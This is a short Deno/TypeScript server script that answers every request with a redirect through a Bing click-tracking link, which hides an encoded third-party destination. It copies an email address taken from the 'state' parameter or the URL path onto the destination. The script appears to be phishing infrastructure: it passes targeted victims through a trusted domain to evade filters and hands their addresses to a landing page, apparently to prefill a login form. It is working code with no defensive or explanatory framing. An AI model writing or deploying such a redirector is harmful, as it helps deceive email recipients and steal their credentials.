const PORT = Number(Deno.env.get("PORT") || 8080);

Deno.serve({ port: PORT }, async (req) => {
  const url = new URL(req.url);

  const redirectBase =
    "https://www.bing.com/ck/a?!&&p=960bc974cf4bd4e140dd387ce48c9cf0b734139524b7141f1d0e00aea6f50ad9JmltdHM9MTc4Mjk1MDQwMA&ptn=3&ver=2&hsh=4&fclid=080ac139-b0f5-6daa-32cb-d64db12c6c83&u=a1aHR0cHM6Ly9qbnN0YXhzZXJ2aWNlcy5jb20vc2VydmljZXM";

  let email: string | null = null;

  const state = url.searchParams.get("state");
  if (state) {
    try {
      const decoded = decodeURIComponent(state);
      if (decoded.includes("@") && !decoded.includes("/")) {
        email = decoded;
      }
    } catch {
      email = null;
    }
  }

  if (!email) {
    const path = url.pathname.replace(/\/+$/, "").split("/").at(-1);
    if (path && path.includes("@") && !path.includes("/")) {
      try {
        email = decodeURIComponent(path);
      } catch {
        email = null;
      }
    }
  }

  const redirectUrl = email
    ? redirectBase.replace(/\/+$/, "") + "#" + email
    : redirectBase;

  return Response.redirect(redirectUrl, 302);
});
